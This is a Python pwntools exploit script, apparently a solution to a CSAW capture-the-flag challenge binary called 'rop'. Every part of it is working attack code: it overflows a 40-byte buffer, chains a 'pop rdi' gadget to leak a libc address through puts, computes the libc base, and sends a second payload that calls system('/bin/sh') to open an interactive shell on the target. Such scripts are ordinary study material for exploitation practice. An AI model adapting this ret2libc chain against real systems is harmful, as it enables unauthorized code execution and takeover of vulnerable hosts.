#!/usr/bin/env python3

from pwn import *

elf = ELF("./rop")
ld = ELF("./ld-2.27.so")
rop = ROP(elf)

context.binary = elf


def conn():
    if args.LOCAL_32:
        libc = ELF("/usr/lib/libc.so.6")
        return (libc, elf.process())
    elif args.LOCAL:
        libc = ELF("./libc-2.27.so")
        return (libc, process([ld.path, elf.path], env={"LD_PRELOAD": libc.path}))
    else:
        libc = ELF("./libc-2.27.so")
        return (libc, remote("pwn.chal.csaw.io",5016))


def main():
    (libc, p) = conn()
    offset = 40


    pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]

    payload = offset * b"A" + p64(pop_rdi) + p64(elf.symbols['__libc_start_main']) + p64(elf.plt['puts']) + p64(elf.symbols['main'])

    p.recv(6) # read hello\n

    p.sendline(payload)

    libc_start_address = int.from_bytes(p.recv(7).rstrip(), byteorder="little")

    libc.address = libc_start_address - libc.sym["__libc_start_main"]
    print("Address of libc %s " % hex(libc.address))

    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols["system"]
    print("/bin/sh = ",hex(binsh))
    print("system = ", hex(system))

    payload = offset * b"A" + p64(pop_rdi) + p64(binsh) + p64(system) + p64(pop_rdi) + p64(binsh) + p64(system) # i uh need to do this twice idk why pls dont ask me
    open("payload.txt","wb").write(payload)
    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
